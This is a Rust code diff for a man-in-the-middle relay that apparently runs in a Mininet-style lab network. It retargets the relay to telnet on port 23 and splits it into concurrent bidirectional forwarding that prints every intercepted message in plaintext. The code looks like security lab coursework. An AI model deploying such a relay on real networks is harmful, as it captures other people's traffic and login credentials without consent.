@@ -1,5 +1,5 @@
 use pcap::{Capture, Device};
-use tokio::io::{split, AsyncReadExt, AsyncWriteExt};
+use tokio::io::{split, AsyncReadExt, AsyncWriteExt, ReadHalf, WriteHalf};
 use smoltcp::{
     phy::DeviceCapabilities,
     wire::{EthernetAddress, IpAddress, IpCidr},
@@ -10,7 +10,7 @@ use anyhow::{anyhow, Context, Ok, Result};
 const DEVICE_CONNECTED_TO_SERVER: &str = "mid_h-eth1";
 const DEVICE_CONNECTED_TO_CLIENT: &str = "mid_h-eth0";
 const SERVER_IP: &str = "10.0.0.3/8";
-const SERVER_SOCET_ADDR: &str = "10.0.0.3:9000";
+const SERVER_SOCET_ADDR: &str = "10.0.0.3:23";
 const GATEWAY: &str = "10.0.0.1";
 
 #[cfg(unix)]
@@ -61,29 +61,39 @@ async fn man_in_the_middle(client_to_mid: tokio_smoltcp::TcpStream, server_to_mi
         result        
     }
 
-    let mut buffer = vec![0; 1024];
+    async fn read_and_write(mut reader: ReadHalf<tokio_smoltcp::TcpStream>,mut writer: WriteHalf<tokio_smoltcp::TcpStream>, client_addr: std::net::SocketAddr)->Result<()>{
+        let mut buffer = vec![0;1024];
+        loop {
+            let bytes_read = reader.read(&mut buffer).await?;
 
-
-    let (mut client_reader, mut client_writer) = split(client_to_mid);
-    let (mut server_reader,mut server_writer) = split(server_to_mid);
-
-    loop{
-        let mut bytes_read = client_reader.read(&mut buffer).await?;
-        if bytes_read == 0 {
-            println!("connection to {} closed",client_addr);
-            break;
+            if bytes_read == 0 {
+                println!("connection to {} closed", client_addr);
+                break;
+            }
+            println!("|\n| {} -> {}\n| bytes : {} \n| message : {}\n|_", client_addr, SERVER_SOCET_ADDR, bytes_read, vec_to_string(&buffer,bytes_read));
+            
+            writer.write_all(&buffer[..bytes_read]).await?;                
         }
-
-        println!("|\n| {} -> {}\n| bytes : {} \n| message : {}\n|_",client_addr,SERVER_SOCET_ADDR,bytes_read, vec_to_string(&buffer,bytes_read));
-
-        server_writer.write_all(&buffer[..bytes_read]).await?;
-        bytes_read = server_reader.read(&mut buffer).await?;
-
-        
-        println!("|\n| {} -> {}\n| bytes : {} \n| message : {}\n|_",SERVER_SOCET_ADDR,client_addr,bytes_read, vec_to_string(&buffer,bytes_read));
-        
-        client_writer.write_all(&buffer[..bytes_read]).await?;
+        Ok(())
     }
+
+    let (client_reader, client_writer) = split(client_to_mid);
+    let (server_reader,server_writer) = split(server_to_mid);
+    
+    let cli_to_srv = tokio::spawn(async move{
+        if let Err(err) = read_and_write(client_reader, server_writer, client_addr).await{
+            println!("error: {:?}",err);
+        };
+    });
+    let srv_to_cli = tokio::spawn(async move{        
+        if let Err(err) = read_and_write(server_reader, client_writer, client_addr).await{
+            println!("error: {:?}",err);
+        };
+    });
+
+    cli_to_srv.await.unwrap();
+    srv_to_cli.await.unwrap();
+
     Ok(())
 }
 
